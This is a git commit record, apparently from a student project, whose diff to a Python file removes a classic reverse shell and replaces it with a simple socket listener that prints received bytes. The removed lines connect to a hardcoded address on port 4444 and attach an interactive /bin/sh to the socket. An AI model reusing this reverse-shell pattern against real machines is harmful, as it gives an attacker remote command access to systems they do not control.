c40a2a3bee42edd4d921c35073f3f8d62c730639
Rodrigo <r.martin.nunez@student.tue.nl>
2022-05-15 15:24:55 +0200

    Simple listen for server

--- src/main.py
+++ src/main.py
@@ -3,12 +3,12 @@ import socket,subprocess
 
 def main(ip: str, port: int):
     s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-    s.connect((ip,port))
-    os.dup2(s.fileno(),0)
-    os.dup2(s.fileno(),1)
-    os.dup2(s.fileno(),2)
-    p=subprocess.call(["/bin/sh","-i"])
-
+    server_address = (ip, port)
+    s.bind(server_address)
+    s.listen()
+    conn, client_address = s.accept()
+    data = conn.recv(15)
+    print(data)
 
 if __name__ == "__main__":
     main("172.20.10.2", 4444)
